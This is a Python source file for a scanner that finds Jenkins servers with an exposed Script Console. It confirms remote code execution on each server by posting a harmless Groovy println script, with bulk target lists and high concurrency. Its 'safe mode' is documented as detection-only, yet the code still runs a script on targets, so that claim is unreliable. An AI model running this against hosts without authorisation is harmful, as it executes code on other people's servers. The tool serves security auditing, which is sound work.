#!/usr/bin/env python3
"""
Jenkins Script Console RCE Scanner
==================================

Scans for open or accessible Jenkins instances that expose the Script Console,
a high-risk endpoint allowing unauthenticated or weakly authenticated users to
execute arbitrary code on the underlying server.

Background:
 - The Jenkins Script Console (/script) is often a target for attackers due to the sensitive operations it supports.
 - Misconfigured or unprotected servers may leave this endpoint exposed, leading to a Remote Code Execution (RCE) vulnerability.
 - Common exposures include weak credentials, anonymous read access allowing access to /script, or Administrator Role Strategy plugin misconfigurations.
 - There is no single CVE associated with this scanner as it addresses a broader class of configuration issues and RCE vectors.

Usage:
  # Scan a single Jenkins server
  python jenkins_script_console_rce_scanner.py --target http://jenkins.example.com

  # Batch scan using a list of targets
  python jenkins_script_console_rce_scanner.py --list targets.txt --output findings.json

  # Safe detection-only mode (does not execute test scripts)
  python jenkins_script_console_rce_scanner.py --list targets.txt --safe

  # Adjust concurrency level while scanning
  python jenkins_script_console_rce_scanner.py --list targets.txt --concurrency 50

References:
  - https://www.jenkins.io/doc/book/security/
  - https://wiki.jenkins.io/display/JENKINS/Script+Console
"""

import asyncio
import httpx
import argparse
import json
import os
from urllib.parse import urljoin
from datetime import datetime

# Jenkins detection markers
JENKINS_FINGERPRINTS = [
    "Jenkins", "X-Jenkins", "Jenkins-Crumb", "/manage", "Welcome to Jenkins!", "Jenkins Dashboard"
]

# Jenkins Script Console paths
SCRIPT_CONSOLE_PATHS = [
    "/script", "/scriptText", "/manage/script", "/manage/scriptText"
]

RCE_TEST_SCRIPT = "println('JenkinsRCEChecker')"

SAFE_MODE_PROBE = "println('JenkinsDetect')"
SAFE_MODE_EXPECTED_OUTPUT = "JenkinsDetect"

SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 10
OUTPUT_COLOR = True  # ANSI output enabled/disabled by default


# ── Utility Functions ──────────────────────────────────────────────────────────

def color_output(text: str, color_code: str) -> str:
    """Colorize terminal output if OUTPUT_COLOR is True."""
    if OUTPUT_COLOR:
        return f"\033[{color_code}m{text}\033[0m"
    return text


def severity_color(level: str) -> str:
    """Map severity level to color codes."""
    colors = {
        "INFO": "92",    # Green
        "HIGH": "93",    # Yellow
        "CRITICAL": "91" # Red
    }
    return colors.get(level, "0")


def format_message(level: str, message: str) -> str:
    """Format a message with ANSI colors based on its severity."""
    return f"{color_output(level, severity_color(level))}: {message}"


def normalize_url(url: str) -> str:
    """Ensure a URL starts with HTTP(s) and remove trailing slashes."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


def parse_response_content(content: str) -> str:
    """Extract meaningful content from HTTP response."""
    return content.strip() if content else "No response content"


# ── Core Detection and Exploitation Functions ─────────────────────────────────

async def check_jenkins_instance(client: httpx.AsyncClient, url: str) -> dict:
    """Check if the target URL is running a Jenkins instance."""
    detection_data = {"url": url, "jenkins": False, "details": None}

    for path in ["/", "/login", "/manage", "/userContent"]:
        full_url = urljoin(url, path)
        try:
            response = await client.get(full_url)
            if any(marker in response.text for marker in JENKINS_FINGERPRINTS) or \
               any(key in response.headers for key in JENKINS_FINGERPRINTS):
                detection_data["jenkins"] = True
                detection_data["details"] = parse_response_content(response.text)
                break
        except Exception as e:
            detection_data["error"] = str(e)
            break

    return detection_data


async def test_script_console_rce(client: httpx.AsyncClient, url: str, safe_mode: bool) -> dict:
    """Test for RCE vulnerabilities using the Jenkins script console."""
    rce_data = {"url": url, "vulnerable": False}
    payload = SAFE_MODE_PROBE if safe_mode else RCE_TEST_SCRIPT
    expected_output = SAFE_MODE_EXPECTED_OUTPUT if safe_mode else "JenkinsRCEChecker"

    for path in SCRIPT_CONSOLE_PATHS:
        full_url = urljoin(url, path)
        try:
            response = await client.post(full_url, data={"script": payload})
            if expected_output in response.text:
                rce_data["vulnerable"] = True
                rce_data["poc_url"] = full_url
                rce_data["response"] = parse_response_content(response.text)
                break
        except Exception as e:
            rce_data["error"] = str(e)
            break

    return rce_data


# ── Asynchronous Scanner Implementation ──────────────────────────────────────

async def scan_target(semaphore: asyncio.Semaphore, url: str, safe_mode: bool) -> dict:
    """Scan a single target for Jenkins RCE vulnerabilities."""
    async with semaphore:
        async with httpx.AsyncClient(verify=False, timeout=REQUEST_TIMEOUT) as client:
            report = await check_jenkins_instance(client, url)
            if report.get("jenkins"):
                rce_result = await test_script_console_rce(client, url, safe_mode)
                report.update(rce_result)
            return report


async def scan_targets(targets: list, concurrency: int, safe_mode: bool) -> list:
    """Scan multiple targets concurrently."""
    semaphore = asyncio.Semaphore(concurrency)
    tasks = [scan_target(semaphore, target, safe_mode) for target in targets]
    return await asyncio.gather(*tasks)


def load_targets_from_file(file_path: str) -> list:
    """Load target URLs from a file."""
    with open(file_path, "r") as f:
        return [normalize_url(line.strip()) for line in f if line.strip()]


# ── CLI Argument Parsing and Output ───────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="Jenkins Script Console RCE Scanner — Detects and tests for accessible script console vulnerabilities in Jenkins instances."
    )
    parser.add_argument("--target", help="Single target URL to scan", type=str)
    parser.add_argument("--list", help="Path to a file containing target URLs", type=str)
    parser.add_argument("--output", help="Save JSON scan results to this file", type=str)
    parser.add_argument("--safe", help="Safe mode (detection only, no active probes)", action="store_true")
    parser.add_argument("--concurrency", help="Number of concurrent requests", type=int, default=SEMAPHORE_LIMIT)
    parser.add_argument("--no-verify", help="Disable SSL verification", action="store_true")
    parser.add_argument("--no-color", help="Disable ANSI color output", action="store_true")
    return parser.parse_args()


def save_results_to_file(results: list, output_file: str):
    with open(output_file, "w") as f:
        json.dump(results, f, indent=4)
        print(format_message("INFO", f"Results saved to {output_file}"))


# ── Main Execution Logic ──────────────────────────────────────────────────────

async def main():
    args = parse_args()
    global OUTPUT_COLOR
    OUTPUT_COLOR = not args.no_color

    if not args.target and not args.list:
        print(format_message("CRITICAL", "Provide either --target or --list"))
        return

    # Construct target list
    targets = []
    if args.target:
        targets.append(normalize_url(args.target))
    if args.list:
        targets.extend(load_targets_from_file(args.list))

    # Scan targets
    print(format_message("INFO", f"Starting scan on {len(targets)} target(s)..."))
    results = await scan_targets(targets, args.concurrency, args.safe)

    # Print summary and save results
    for result in results:
        if result.get("jenkins"):
            severity = "CRITICAL" if result.get("vulnerable") else "HIGH"
            status = "Vulnerable" if result.get("vulnerable") else "Detected"
            print(format_message(severity, f"{status}: {result['url']}"))
            if result.get("vulnerable"):
                print(f"    Proof of Concept: {result.get('poc_url')}")
                print(f"    Response: {result.get('response')}")
        else:
            print(format_message("INFO", f"Not Jenkins: {result['url']}"))

    if args.output:
        save_results_to_file(results, args.output)


if __name__ == "__main__":
    asyncio.run(main())
